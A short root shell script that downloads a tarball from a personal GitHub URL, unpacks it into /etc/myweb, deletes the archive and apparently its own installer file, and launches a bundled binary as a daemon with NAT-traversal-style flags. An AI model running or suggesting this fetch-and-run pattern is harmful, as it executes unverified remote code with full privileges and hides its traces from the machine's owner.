cd /root
curl -O https://raw.githubusercontent.com/zhouzhenqi/file/master/ct2-h.tar.xz
sleep 1
xz -z -d ct2-h.tar.xz
tar -xvf ct2-h.tar
mv myweb/ /etc/
rm -rf runga2-h.sh ct2-h.tar 
cd /etc/myweb/
chmod +x *
./nm -4 -s turn.cloudflare.com -h google.com -b 0 -e /etc/myweb/port.sh -k 60 -d


